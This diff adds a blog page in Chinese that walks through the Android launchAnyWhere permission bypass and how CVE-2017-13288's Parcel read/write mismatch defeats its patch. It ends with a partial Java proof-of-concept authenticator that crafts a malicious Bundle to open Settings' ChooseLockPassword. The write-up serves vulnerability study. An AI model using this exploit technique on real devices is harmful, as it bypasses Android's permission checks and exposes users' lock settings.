@@ -1,0 +1,786 @@
+<!DOCTYPE html>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="en">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=6.4.1" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=6.4.1">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=6.4.1">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=6.4.1" color="#222">
+
+
+
+
+
+
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '6.4.1',
+    sidebar: {"position":"left","display":"always","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: false,
+    fastclick: false,
+    lazyload: false,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+  
+
+
+
+
+  <meta name="description" content="这篇文章主要讲述的是Android序列化与反序列化中出现的漏洞以及其利用的方法 文章首先会介绍一些与漏洞相关的Android基础知识，然后会介绍launchAnyWhere: Activity组件权限绕过漏洞解析，之后会介绍如何利用序列化和反序列化的漏洞来绕过launchAnyWhere的补丁 Android 基础知识Activty  Activity是Android的四大组件之一。是用户操作的可">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Android Bundle风水复现">
+<meta property="og:url" content="https://ch4r1l3.github.io/2020/09/12/Android-Bundle风水复现/index.html">
+<meta property="og:site_name" content="PWN? PWN!">
+<meta property="og:description" content="这篇文章主要讲述的是Android序列化与反序列化中出现的漏洞以及其利用的方法 文章首先会介绍一些与漏洞相关的Android基础知识，然后会介绍launchAnyWhere: Activity组件权限绕过漏洞解析，之后会介绍如何利用序列化和反序列化的漏洞来绕过launchAnyWhere的补丁 Android 基础知识Activty  Activity是Android的四大组件之一。是用户操作的可">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="https://ch4r1l3.github.io/2020/09/12/Android-Bundle风水复现/t1.png">
+<meta property="og:image" content="https://ch4r1l3.github.io/2020/09/12/Android-Bundle风水复现/t2.png">
+<meta property="og:image" content="https://ch4r1l3.github.io/2020/09/12/Android-Bundle风水复现/t3.png">
+<meta property="og:image" content="https://ch4r1l3.github.io/2020/09/12/Android-Bundle风水复现/t4.png">
+<meta property="og:image" content="https://ch4r1l3.github.io/2020/09/12/Android-Bundle风水复现/t5.png">
+<meta property="og:updated_time" content="2020-09-13T13:55:31.770Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Android Bundle风水复现">
+<meta name="twitter:description" content="这篇文章主要讲述的是Android序列化与反序列化中出现的漏洞以及其利用的方法 文章首先会介绍一些与漏洞相关的Android基础知识，然后会介绍launchAnyWhere: Activity组件权限绕过漏洞解析，之后会介绍如何利用序列化和反序列化的漏洞来绕过launchAnyWhere的补丁 Android 基础知识Activty  Activity是Android的四大组件之一。是用户操作的可">
+<meta name="twitter:image" content="https://ch4r1l3.github.io/2020/09/12/Android-Bundle风水复现/t1.png">
+
+
+
+
+
+
+  <link rel="canonical" href="https://ch4r1l3.github.io/2020/09/12/Android-Bundle风水复现/"/>
+
+
+
+<script type="text/javascript" id="page.configurations">
+  CONFIG.page = {
+    sidebar: "",
+  };
+</script>
+
+  <title>Android Bundle风水复现 | PWN? PWN!</title>
+  
+
+
+
+
+
+
+
+
+
+  <noscript>
+  <style type="text/css">
+    .use-motion .motion-element,
+    .use-motion .brand,
+    .use-motion .menu-item,
+    .sidebar-inner,
+    .use-motion .post-block,
+    .use-motion .pagination,
+    .use-motion .comments,
+    .use-motion .post-header,
+    .use-motion .post-body,
+    .use-motion .collection-title { opacity: initial; }
+
+    .use-motion .logo,
+    .use-motion .site-title,
+    .use-motion .site-subtitle {
+      opacity: initial;
+      top: initial;
+    }
+
+    .use-motion {
+      .logo-line-before i { left: initial; }
+      .logo-line-after i { right: initial; }
+    }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="en">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">PWN? PWN!</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+    
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Toggle navigation bar">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  
+    <ul id="menu" class="menu">
+      
+        
+        
+        
+          
+          <li class="menu-item menu-item-home">
+    <a href="/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-home"></i> <br />Home</a>
+  </li>
+        
+        
+        
+          
+          <li class="menu-item menu-item-archives">
+    <a href="/archives/" rel="section">
+      <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />Archives</a>
+  </li>
+
+      
+      
+    </ul>
+  
+
+  
+
+  
+</nav>
+
+
+
+  
+
+
+
+</div>
+    </header>
+
+    
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+            
+
+          
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://ch4r1l3.github.io/2020/09/12/Android-Bundle风水复现/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Charlie">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="PWN? PWN!">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Android Bundle风水复现
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+
+            
+            
+            
+
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+
+              
+                
+              
+
+              <time title="Created: 2020-09-12 10:54:24" itemprop="dateCreated datePublished" datetime="2020-09-12T10:54:24+08:00">2020-09-12</time>
+            
+
+            
+              
+
+              
+                
+                <span class="post-meta-divider">|</span>
+                
+
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">Edited on</span>
+                
+                <time title="Modified: 2020-09-13 21:55:31" itemprop="dateModified" datetime="2020-09-13T21:55:31+08:00">2020-09-13</time>
+              
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>这篇文章主要讲述的是Android序列化与反序列化中出现的漏洞以及其利用的方法</p>
+<p>文章首先会介绍一些与漏洞相关的Android基础知识，然后会介绍launchAnyWhere: Activity组件权限绕过漏洞解析，之后会介绍如何利用序列化和反序列化的漏洞来绕过launchAnyWhere的补丁</p>
+<h3 id="Android-基础知识"><a href="#Android-基础知识" class="headerlink" title="Android 基础知识"></a>Android 基础知识</h3><h4 id="Activty"><a href="#Activty" class="headerlink" title="Activty"></a>Activty</h4><p>  Activity是Android的四大组件之一。是用户操作的可视化界面；它为用户提供了一个完成操作指令的窗口。当我们创建完毕Activity之后，需要调用setContentView()方法来完成界面的显示；以此来为用户提供交互的入口。在Android App 中只要能看见的几乎都要依托于Activity，所以Activity是在开发中使用最频繁的一种组件。</p>
+<p> Android应用里面都有一个AndroidManifest.xml文件，用于配置应用里面各种组件，包括Activity。当Activity的配置里面包含android:exported=”true”或者配置了intent-filter但是没有配置了android:exported 的时候，可以被其他应用调起该Activity。如果没有配置的话，只能被当前应用的其他组件调起，或者系统应用调起。</p>
+<h4 id="Intent"><a href="#Intent" class="headerlink" title="Intent"></a>Intent</h4><p>Intent 是 Android 非常常用的一个用于组件间互相通信的信息对象，常用于启动组件和传递数据，大部分的程序里都有着他的身影。</p>
+<h4 id="Parcelable"><a href="#Parcelable" class="headerlink" title="Parcelable"></a>Parcelable</h4><p>Android提供了独有的Parcelable接口来实现序列化的方法，只要实现这个接口，一个类的对象就可以实现序列化并可以通过Intent进行传输，Intent也是一个Parcelable类，下面示例是Parcelable的典型用法。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">public class MyParcelable implements Parcelable &#123;</span><br><span class="line">     private int mData;</span><br><span class="line"></span><br><span class="line">     public int describeContents() &#123;</span><br><span class="line">         return 0;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     public void writeToParcel(Parcel out, int flags) &#123;</span><br><span class="line">         out.writeInt(mData);</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     public void readFromParcel(Parcel reply) &#123;</span><br><span class="line">         mData = in.readInt();</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     public static final Parcelable.Creator&lt;MyParcelable&gt; CREATOR</span><br><span class="line">             = new Parcelable.Creator&lt;MyParcelable&gt;() &#123;</span><br><span class="line">         public MyParcelable createFromParcel(Parcel in) &#123;</span><br><span class="line">             return new MyParcelable(in);</span><br><span class="line">         &#125;</span><br><span class="line"></span><br><span class="line">         public MyParcelable[] newArray(int size) &#123;</span><br><span class="line">             return new MyParcelable[size];</span><br><span class="line">         &#125;</span><br><span class="line">     &#125;;</span><br><span class="line"></span><br><span class="line">     private MyParcelable(Parcel in) &#123;</span><br><span class="line">         mData = in.readInt();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
+<p>其中，关键的writeToParcel和readFromParcel方法，分别调用Parcel类中的一系列write方法和read方法实现序列化和反序列化。</p>
+<h4 id="Bundle"><a href="#Bundle" class="headerlink" title="Bundle"></a>Bundle</h4><p>可序列化的Parcelable对象一般不单独进行序列化传输，需要通过Bundle对象携带。 Bundle的内部实现实际是Hashmap，以Key-Value键值对的形式存储数据。例如， Android中进程间通信频繁使用的Intent对象中可携带一个Bundle对象，利用putExtra(key, value)方法，可以往Intent的Bundle对象中添加键值对(Key Value)。Key为String类型，而Value则可以为各种数据类型，包括int、Boolean、String和Parcelable对象等等，Parcel类中维护着这些类型信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">// Keep in sync with frameworks/native/include/private/binder/ParcelValTypes.h.</span><br><span class="line">    private static final int VAL_NULL = -1;</span><br><span class="line">    private static final int VAL_STRING = 0;</span><br><span class="line">    private static final int VAL_INTEGER = 1;</span><br><span class="line">    private static final int VAL_MAP = 2;</span><br><span class="line">    private static final int VAL_BUNDLE = 3;</span><br><span class="line">    private static final int VAL_PARCELABLE = 4;</span><br><span class="line">    private static final int VAL_SHORT = 5;</span><br><span class="line">    private static final int VAL_LONG = 6;</span><br><span class="line">    private static final int VAL_FLOAT = 7;</span><br></pre></td></tr></table></figure>
+<h3 id="launchAnyWhere-Activity-组件权限绕过"><a href="#launchAnyWhere-Activity-组件权限绕过" class="headerlink" title="launchAnyWhere Activity 组件权限绕过"></a>launchAnyWhere Activity 组件权限绕过</h3><p>这个是关于Android系统Service：AccountManagerService的一个漏洞，我们首先来介绍一下AccountManagerService</p>
+<h4 id="AccountManagerService"><a href="#AccountManagerService" class="headerlink" title="AccountManagerService"></a>AccountManagerService</h4><p>很多手机上的应用都提供了账号授权的功能，例如微信、支付宝、邮件、Google服务等，于是Google提供了一个AccountManagerService，用于管理用户的各种网络账号，其他应用可以通过AccountManagerService获取这个账号的token，用来请求一些网络服务。</p>
+<p>因为每个应用的登录方式和token获取方式肯定存在差异，因此AccountManager的身份验证也被设计成可插件化的形式：由提供账号相关的应用去实现账号认证。提供账号的应用可以自己实现一套登陆UI，接收用户名和密码；请求自己的认证服务器返回一个token；将token缓存给AccountManager。</p>
+<p>可以从“设置-&gt; 添加账户”中看到系统内可提供网络账户的应用：</p>
+<p><img src="/2020/09/12/Android-Bundle风水复现/t1.png" alt=""></p>
+<p>如果想要出现在这个页面里，应用需要声明一个账户认证服务AuthenticationService：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;service</span><br><span class="line">       android:name=&quot;.authenticator.AuthenticationService&quot;</span><br><span class="line">       android:exported=&quot;true&quot;&gt;</span><br><span class="line">            &lt;intent-filter&gt;</span><br><span class="line">                &lt;action</span><br><span class="line">                    android:name=&quot;android.accounts.AccountAuthenticator&quot; /&gt;</span><br><span class="line">            &lt;/intent-filter&gt;</span><br><span class="line">            &lt;meta-data</span><br><span class="line">                android:name=&quot;android.accounts.AccountAuthenticator&quot;</span><br><span class="line">                android:resource=&quot;@xml/authenticator&quot; /&gt;</span><br><span class="line">&lt;/service&gt;</span><br></pre></td></tr></table></figure>
+<p>并且在服务中提供一个Binder</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">    public IBinder onBind(Intent intent) &#123;</span><br><span class="line">//class Authenticator extends AbstractAccountAuthenticator</span><br><span class="line">        return mAuthenticator.getIBinder();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>普通应用（记为AppA）去请求添加某类账户时，会调用AccountManager.addAccount,然后AccountManager会去查找提供账号的应用（记为AppB）的Authenticator类，调用Authenticator. addAccount方法；AppA再根据AppB返回的Intent去调起AppB的账户登录界面。</p>
+<p>这个过程如图所示：</p>
+<p><img src="/2020/09/12/Android-Bundle风水复现/t2.png" alt=""></p>
+<p>具体来说就是：</p>
+<ol>
+<li>AppA请求添加一个特定类型的网络账号</li>
+<li>系统查询到AppB可以提供一个该类型的网络账号服务，系统向AppB发起请求</li>
+<li>AppB返回了一个intent给系统，系统把intent转发给appA</li>
+<li>AccountManagerResponse在AppA的进程空间内调用 startActivity(intent)调起一个Activity，AccountManagerResponse是FrameWork中的代码， AppA对这一调用毫不知情。</li>
+</ol>
+<p>这种设计的本意是，AccountManagerService帮助AppA查找到AppB账号登陆页面，并调起这个登陆页面。而问题在于，AppB可以任意指定这个intent所指向的组件，AppA将在不知情的情况下由AccountManagerResponse调用起了一个Activity. 如果AppA是一个system权限应用，比如Settings，那么就可以调起任意应用的未导出Activity，导致权限的绕过。</p>
+<p>但问题是，怎么才能让Settings触发添加账户呢？如果从“设置-&gt;添加账户”的页面去触发，则需要用户手工点击才能触发，这样攻击的成功率将大大降低，因为一般用户是很少从这里添加账户的，用户往往习惯直接从应用本身登陆。</p>
+<p>不过现在就放弃还太早，其实Settings早已经给我们留下触发接口。只要我们调用com.android.settings.accounts.AddAccountSettings，并给Intent带上特定的参数，即可让Settings触发launchAnyWhere：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Intent intent1 = new Intent();</span><br><span class="line">intent1.setComponent(new ComponentName(</span><br><span class="line">        &quot;com.android.settings&quot;,</span><br><span class="line">        &quot;com.android.settings.accounts.AddAccountSettings&quot;));</span><br><span class="line">intent1.setAction(Intent.ACTION_RUN);</span><br><span class="line">intent1.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);</span><br><span class="line">String authTypes[] = &#123;Constants.ACCOUNT_TYPE&#125;;</span><br><span class="line"></span><br><span class="line">intent1.putExtra(&quot;account_types&quot;, authTypes);</span><br><span class="line">AuthenticatorActivity.this.startActivity(intent1);</span><br></pre></td></tr></table></figure>
+<p>过程如Step0所示</p>
+<p><img src="/2020/09/12/Android-Bundle风水复现/t3.png" alt=""></p>
+<p>安卓4.4已经修复了这个漏洞[4].检查了Step3中返回的intent所指向的Activity和AppB是否是有相同签名的。避免了luanchAnyWhere的可能。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">+        @Override</span><br><span class="line">         public void onResult(Bundle result) &#123;</span><br><span class="line">             mNumResults++;</span><br><span class="line">-            if (result != null &amp;&amp; !TextUtils.isEmpty(result.getString(AccountManager.KEY_AUTHTOKEN))) &#123;</span><br><span class="line">+            Intent intent = null;</span><br><span class="line">+            if (result != null</span><br><span class="line">+                    &amp;&amp; (intent = result.getParcelable(AccountManager.KEY_INTENT)) != null) &#123;</span><br><span class="line">+                /*</span><br><span class="line">+                 * The Authenticator API allows third party authenticators to</span><br><span class="line">+                 * supply arbitrary intents to other apps that they can run,</span><br><span class="line">+                 * this can be very bad when those apps are in the system like</span><br><span class="line">+                 * the System Settings.</span><br><span class="line">+                 */</span><br><span class="line">+                PackageManager pm = mContext.getPackageManager();</span><br><span class="line">+                ResolveInfo resolveInfo = pm.resolveActivity(intent, 0);</span><br><span class="line">+                int targetUid = resolveInfo.activityInfo.applicationInfo.uid;</span><br><span class="line">+                int authenticatorUid = Binder.getCallingUid();</span><br><span class="line">+                if (PackageManager.SIGNATURE_MATCH !=</span><br><span class="line">+                        pm.checkSignatures(authenticatorUid, targetUid)) &#123;</span><br><span class="line">+                    throw new SecurityException(</span><br><span class="line">+                            &quot;Activity to be started with KEY_INTENT must &quot; +</span><br><span class="line">+                            &quot;share Authenticator&apos;s signatures&quot;);</span><br><span class="line">+                &#125;</span><br><span class="line">+            &#125;</span><br><span class="line">+            if (result != null</span><br><span class="line">+                    &amp;&amp; !TextUtils.isEmpty(result.getString(AccountManager.KEY_AUTHTOKEN))) &#123;</span><br></pre></td></tr></table></figure></p>
+<h3 id="CVE-2017-13288"><a href="#CVE-2017-13288" class="headerlink" title="CVE-2017-13288"></a>CVE-2017-13288</h3><p>这个是一个关于PeriodicAdvertisingReport类序列化与反序列化不匹配的漏洞，我们先来看下源码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">    public void writeToParcel(Parcel dest, int flags) &#123;</span><br><span class="line">        dest.writeInt(syncHandle);</span><br><span class="line">        dest.writeLong(txPower);</span><br><span class="line">        dest.writeInt(rssi);</span><br><span class="line">        dest.writeInt(dataStatus);</span><br><span class="line">        if (data != null) &#123;</span><br><span class="line">            dest.writeInt(1);</span><br><span class="line">            dest.writeByteArray(data.getBytes());</span><br><span class="line">        &#125; else &#123;</span><br><span class="line">            dest.writeInt(0);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    private void readFromParcel(Parcel in) &#123;</span><br><span class="line">        syncHandle = in.readInt();</span><br><span class="line">        txPower = in.readInt();</span><br><span class="line">        rssi = in.readInt();</span><br><span class="line">        dataStatus = in.readInt();</span><br><span class="line">        if (in.readInt() == 1) &#123;</span><br><span class="line">            data = ScanRecord.parseFromBytes(in.createByteArray());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<p>上面是这个类序列化和反序列化的函数，在序列化txPower这个字段的时候，写入的是Long，写入了8字节，但是在反序列化的时候，是调用了readInt读取，读取了4个字节，然后就导致了序列化和反序列化的不匹配。</p>
+<p>但是这个有什么用呢？我们再一次回顾上面的LanuchAnywhere漏洞</p>
+<p><img src="/2020/09/12/Android-Bundle风水复现/t4.png" alt=""></p>
+<p>可以看到，从AppB到Settings一共经过了2次序列化和2次反序列化</p>
+<ol>
+<li>首先是普通AppB返回了一共Bundle对象，这个对象包含一共键值对，{KEY_INTENT:intent}，然后序列化为数据，传递到AccountManagerService</li>
+<li>AccountManagerService将数据反序列化为原本的类，检查其中是否包含KEY_INTENT这个键，包含的话，取出对应的值，然后检查对应的intent所指向的Activity和AppB是否是有相同签名的, 避免了luanchAnyWhere的可能。</li>
+<li>AccountManagerService将反序列化后的类再一次序列化，传递到Setting应用</li>
+<li>Setting应用进行反序列化，取出KEY_INTENT对应的值，调用startActivity方法调起对应的Activity</li>
+</ol>
+<p>如果我们利用序列化和反序列化不对称的漏洞，就可以绕过AccountManagerService里面的检查了，那么具体怎么做呢？</p>
+<p><img src="/2020/09/12/Android-Bundle风水复现/t5.png" alt=""></p>
+<p>首先构造一个Bundle，有2个键值对，第一个Key Value，携带PeriodicAdvertisingReport类，第二个Key Value随便放点东西就可以了</p>
+<p>在PeriodicAdvertisingReport类里面可以放一个恶意的KEY_INTENT键值对，在第一次反序列化的时候，还是作为PeriodicAdvertisingReport类的一个字段，所以没有被AccountManagerService检测出来</p>
+<p>之后经过序列化和反序列化，Setting中取出的类里面，恶意的KEY_INTENT键值对就变成了第二个Key Value，然后Setting就会取出恶意的KEY_INTENT，调用startActity调用对应的Activity，达成攻击。</p>
+<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>最终的POC如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">public class MyAuthenticator extends AbstractAccountAuthenticator &#123;</span><br><span class="line">    static final String TAG = &quot;MyAuthenticator&quot;;</span><br><span class="line"></span><br><span class="line">    private Context m_context = null;</span><br><span class="line"></span><br><span class="line">    public MyAuthenticator(Context context) &#123;</span><br><span class="line">        super(context);</span><br><span class="line">        m_context = context;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Bundle editProperties(AccountAuthenticatorResponse response, String accountType) &#123;</span><br><span class="line">        return null;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    @Override</span><br><span class="line">    public Bundle addAccount(AccountAuthenticatorResponse response, String accountType, String authTokenType, String[] requiredFeatures, Bundle options) throws NetworkErrorException &#123;</span><br><span class="line">        Log.v(TAG, &quot;addAccount&quot;);</span><br><span class="line"></span><br><span class="line">        Bundle evilBundle = new Bundle();</span><br><span class="line">        Parcel bndlData = Parcel.obtain();</span><br><span class="line">        Parcel pcelData = Parcel.obtain();</span><br><span class="line"></span><br><span class="line">        // Manipulate the raw data of bundle Parcel</span><br><span class="line">        // Now we replace this right Parcel data to evil Parcel data</span><br><span class="line">        pcelData.writeInt(2); // number of elements in ArrayMap</span><br><span class="line">        /*****************************************/</span><br><span class="line">        // mismatched object</span><br><span class="line">        pcelData.writeString(&quot;mismatch&quot;);</span><br><span class="line">        pcelData.writeInt(4); // VAL_PACELABLE</span><br><span class="line">        pcelData.writeString(&quot;android.bluetooth.le.PeriodicAdvertisingReport&quot;); // name of Class Loader</span><br><span class="line">        pcelData.writeInt(1);//syncHandle</span><br><span class="line">        pcelData.writeInt(1);//txPower</span><br><span class="line">        pcelData.writeInt(1);//rssi</span><br><span class="line">        pcelData.writeInt(1);//dataStatus</span><br><span class="line">        pcelData.writeInt(1);// flag for data</span><br><span class="line">        pcelData.writeInt(0x144); //length of KEY_INTENT:evilIntent</span><br><span class="line">        // Evil object hide in PeriodicAdvertisingReport.mData</span><br><span class="line">        pcelData.writeString(AccountManager.KEY_INTENT);</span><br><span class="line">        pcelData.writeInt(4);</span><br><span class="line">        pcelData.writeString(&quot;android.content.Intent&quot;);// name of Class Loader</span><br><span class="line">        pcelData.writeString(Intent.ACTION_RUN); // Intent Action</span><br><span class="line">        Uri.writeToParcel(pcelData, null); // Uri is null</span><br><span class="line">        pcelData.writeString(null); // mType is null</span><br><span class="line">        pcelData.writeInt(0x10000000); // Flags</span><br><span class="line">        pcelData.writeString(null); // mPackage is null</span><br><span class="line">        pcelData.writeString(&quot;com.android.settings&quot;);</span><br><span class="line">        pcelData.writeString(&quot;com.android.settings.password.ChooseLockPassword&quot;);</span><br><span class="line">        pcelData.writeInt(0); //mSourceBounds = null</span><br><span class="line">        pcelData.writeInt(0); // mCategories = null</span><br><span class="line">        pcelData.writeInt(0); // mSelector = null</span><br><span class="line">        pcelData.writeInt(0); // mClipData = null</span><br><span class="line">        pcelData.writeInt(-2); // mContentUserHint</span><br><span class="line">        pcelData.writeBundle(null);</span><br><span class="line">        ///////////////////////////////////////</span><br><span class="line">        pcelData.writeString(&quot;Padding-Key&quot;);</span><br><span class="line">        pcelData.writeInt(0); // VAL_STRING</span><br><span class="line">        pcelData.writeString(&quot;Padding-Value&quot;); //       </span><br><span class="line">        int length  = pcelData.dataSize();</span><br><span class="line">        Log.d(TAG, &quot;length is &quot; + Integer.toHexString(length));</span><br><span class="line">        bndlData.writeInt(length);</span><br><span class="line">        bndlData.writeInt(0x4c444E42);</span><br><span class="line">        bndlData.appendFrom(pcelData, 0, 